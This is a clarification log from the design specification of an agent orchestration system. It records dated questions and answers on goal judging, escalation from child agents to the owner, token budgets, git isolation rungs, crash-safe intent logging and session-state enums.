- Q: When the compile-time feasibility gate mis-accepts a criterion the runtime Judge cannot verify (§8.1 D9)? -> A: Fail-closed-to-unmet verdict + escalate-to-owner exactly once; no runtime `criterion_unverifiable` class, criterion stays immutable.
- Q: When must a parent escalate vs answer a child's question (§8.2 D2)? -> A: `authority: owner_required` (credential/spend/irreversible/out-of-parent-goal-scope/low-confidence) MUST escalate — runtime rejects a parent `respond`; `self_ok` MAY be answered.
- Q: Default token budget + brake timing + atomicity + live brake (§8.3 D12)? -> A: unset = unbounded (`0`) + advisory; token≠dollar warning; graceful wind-down at boundary (ADR-049 NFR-3); one atomic pool/lock; no new live cut (restart-gated ceiling, live lever = Stop/cancel).
- Q: git no-go semantics per decision (§8.4)? -> A: D13 → fresh attempt where no commit; D10 → worktree→clone→subdir ladder; D17 → operation-deny + `.git/` sandbox block where a repo exists, "rung-1 diffs unavailable" signalled where degraded.
- Q: Curated context snapshot contents/size/policy (§8.5 D1)? -> A: deny-by-default allow-list (prompt + goal/criteria + parent-named refs + target identity), hard-capped, over-cap rejects the run.
- Q: needs_input warm-resume reconstructability predicate (§8.6)? -> A: `isNeedsInputReconstructable` = AND of {checkpoint present, agent resolves, correlation+owner live, snapshot within cap}; else swept.
- Q: Deep-chain question latency (§8.7 D6)? -> A: opt-in direct-escalate shortcut (default OFF = strict one-hop), bounded by `question_escalation_max_hops`/`_deadline`.
- Q: S4 interlock (§8.8)? -> A: one state machine with named invariants INV-1..INV-9 (dedicated section + mermaid diagram).
- Q: Round-accounting reconciliation (§8.9 D7)? -> A: round = one adjudication; `judge_rounds_max` counts adjudications; stored counts preserved (no inflation); increment site moves.
- Q: S2-lifecycle ↔ D14-pill crosswalk (§8.10)? -> A: two deliberately-distinct enums; `pill = f(lifecycle, engine_phase_overlay, plan_phase)`; `judging`/`judge_unavailable` sourced from EPHEMERAL engine-phase signals, `re-planning` sourced from the DURABLE persisted `plan_phase=awaiting_owner_correction` (C1 — reconstructs as re-planning, not waiting_on_user, after restart); crosswalk table provided.
- Q: Multi-goal-per-session cardinality (§8.11)? -> A: per-goal-id isolation; each active goal-id = one global-cap slot; delegate children not counted; legacy goal maps 1:1.

### 2026-07-22 (grill-FAIL resolution — implementations of locked ADR-053 decisions; no D1–D17 re-opened)

- Q (C1): How does awaiting-owner-correction survive restart without a spurious re-judge, and without the boot sweep failing a legitimately-idle plan? -> A: Make it a DURABLE PLAN condition — persist `plan_phase=awaiting_owner_correction` (new value on the existing persisted `Plan.PlanPhase`) + `last_unmet_terminal_signature` on the plan record; the plan-owner SESSION is durable `paused` (S2 enum stays at 8 states); the boot sweep exempts that paused owner session and honors the persisted signature so it re-dispatches/re-judges only changed/mid-turn plans (FR-147, INV-7/INV-9).
- Q (M1): unjudgeable vs blocked-check predicate? -> A: `classifyNonVerdict` keys on "did the verification mechanism run?" — mechanism-couldn't-run → `unable_to_verify` (re-run, never scored); verifier turn ran but no judgment → `criterion_unjudgeable` (unmet + escalate-once) (FR-137).
- Q (M2): remediation for `criterion_unjudgeable`? -> A: owner re-statement = a diffed, confirmed amendment (new goal generation fixing the criterion) OR `/goal clear`; escalate-once surfaces the problem, it does not halt round-burn; owner-inert → `failed(judge_rounds_exhausted)` (FR-138).
- Q (M3): is the child's `authority` tag trusted? -> A: No — `deriveQuestionAuthority` defaults omission to `owner_required` (fail-closed) and UPGRADES `self_ok → owner_required` on a runtime content check (credential/secret, spend/budget, irreversible tool, out-of-scope); a child cannot downgrade (FR-139).
- Q (M4): how is the multi-entity tail append atomic on per-file JSONL? -> A: write-ahead intent-log — one intent record, apply per-file writes, mark committed; boot rolls back uncommitted / replays committed-unapplied (FR-148, INV-6).
- Q (M5, SC-008): does the pool "never go negative"? -> A: Restated — the counter is never corrupted (atomic), overshoot is BOUNDED by in-flight turn costs (post-turn provider-reported debit); dropped the literal "never negative" claim.
- Q (M6): can an exploratory member "take the worktree rung"? -> A: No — go-git has no `worktree add`; it takes the HIGHEST AVAILABLE isolation rung (system-git worktree → go-git clone → subdir) per FR-154.
- Q (M7): the 7 placeholder FRs? -> A: added real BDD scenarios for the behavioral ones (FR-128/130/146/178/188); explicitly downgraded FR-158 (build-time) + FR-177 (restart-gated config) to config/non-behavioral, amended the completeness claim.
- Q (M8): SessionMessage `direction` for engine/owner-emitted kinds? -> A: added `engine` (drop unused `human`); `revision_entry → engine`, `goal_status → session_to_ui`; all 12 kinds now map to a valid direction.
- Q (contract minors): -> A: enumerated `blocker.severity` (low|medium|high), `progress.pct` (int 0–100), `decision_request.options[]` (array of strings), added envelope `depth` (int ≤5); `peek` is agent-callable (distinct from the FE-5 Agent-View); cap counts standalone tasks (goal-bearing) but not plan members; snapshot mandatory core exempt from `snapshot_max_bytes`; `needs_input.reconstructable` is a park-time hint (re-evaluated at boot); S4 mermaid reconciled to the 8-state enum with a boot-sweep-from-`paused` edge; added tests 60 (goal-clear cancels compilation) + 61 (sibling-isolation negative); folded o3 trigger-level kill flag (`adjudication_enabled`) into operability config.
- **Invariant preserved**: the S2 session-lifecycle enum stays at EXACTLY 8 states (`queued/running/needs_input/paused/completed/failed/cancelled/timed_out`) — awaiting-owner-correction is a durable PLAN condition, never a 9th session state.

### 2026-07-22 (re-grill REVISE resolution — C1 propagation + load-bearing minors)

- Q (M-1): the `re-planning` pill was made durable but its realizing FRs still called it ephemeral. -> A: reconciled FR-185 (2-arg → 3-arg `f(lifecycle, engine_phase_overlay, plan_phase)`), FR-186 (`re-planning` sourced from DURABLE persisted `plan_phase`, only `judging`/`judge_unavailable` ephemeral), US-14 AS-1, the pill BDD, test 12, and the §8.10 clarification — a restarted awaiting-correction plan renders `re-planning`, not `waiting_on_user`.
- Q (m-3): what names the plan↔owner-session linkage the boot-sweep exemption needs (owner_scope is `human`, not `plan_id`)? -> A: persist `Plan.owner_session_id` + a reciprocal `owns_plan_id` on the owner session; the sweep resolves the exemption through that named linkage (FR-147, FR-118, session-record contract, Symbols/Plan row, test 53).
- Q (m-2): intent-log details? -> A: SELF-CONTAINED intent record (full member bodies + edges + revision entry + plan-record patch, not just ids); commit-marker BEFORE apply; replay-forward IDEMPOTENT via a done-marker; boot discards uncommitted (→ pre-append DAG), replays committed-not-done forward (FR-148, INV-6, BDD, test 54).
- Q (m-4): can `unable_to_verify` re-run forever? -> A: No — bounded by `unable_to_verify_max_reruns` (K, default 3); after K consecutive on the same check it escalates to owner as a persistently-blocked check (FR-116, FR-137, R§8.1, M1 BDD outline).
- Q (m-5): is `SessionMessage.depth ≤5` the delegation-depth backstop? -> A: No — it is the message-HOP cap, distinct from and independent of `defaultMaxSubTurnDepth` (default 3) which caps spawn nesting (envelope field + Caps line).
- Q (m-6): config key count? -> A: exactly **21** keys (enumerated in FR-195, incl. `undelivered_retention`); US-15 and FR-195 reconciled to 21; `unable_to_verify_max_reruns` is a verifier-subsystem key, not part of the messaging section.
